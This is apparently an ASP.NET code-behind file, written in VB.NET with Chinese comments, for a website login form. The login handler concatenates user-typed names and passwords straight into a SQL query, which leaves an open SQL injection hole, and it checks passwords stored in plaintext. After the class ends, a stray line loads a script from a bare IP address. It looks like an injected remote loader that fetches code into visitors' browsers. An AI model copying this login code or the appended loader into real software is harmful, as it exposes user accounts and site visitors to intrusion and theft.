Imports System.Data
Imports System.Data.SqlClient
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Public Class WebForm2
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblName As System.Web.UI.WebControls.Label
    Protected WithEvents lblPwd As System.Web.UI.WebControls.Label
    Protected WithEvents btnLogIn As System.Web.UI.WebControls.Button
    Protected WithEvents btnReg As System.Web.UI.WebControls.Button
    Protected WithEvents txtName As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtPwd As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblCheck As System.Web.UI.WebControls.Label
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub btnLogIn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnLogIn.Click
        If Me.txtName.Text.Trim() = "" Or Me.txtPwd.Text.Trim() = "" Then
            Me.lblCheck.Text = "提醒：先先输入用户名和密码"
            Me.lblCheck.Visible = True
            Exit Sub
        End If

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select UserId,AccessPrivilege from userTable where UserId='" + Me.txtName.Text.Trim() + "' and Psd='" + Me.txtPwd.Text.Trim() + "'"
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.Session("UserName") = Me.txtName.Text.Trim()
                Me.Session("AccPri") = sqlReader.GetString(1)
                Response.Redirect("rmodelpublish.aspx")   ' 到搜索页
            Else
                lblCheck.Text = "提醒：错误的用户名或密码，请重新输入，或按注册按钮注册"
                lblCheck.Visible = True
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            mySqlConn.Close()
            'Response.Redirect("error.htm") ' 错误提示
            Throw ex
        Finally
        End Try
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        Me.lblCheck.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        'If Not Page.IsPostBack() Then
        '    Me.btnReg.Attributes.Add("onclick", "Javascript:return confirm('Are you sure to save?');")
        'End If
    End Sub

    Private Sub btnReg_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnReg.Click
        Response.Redirect("newcustomer.aspx")
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
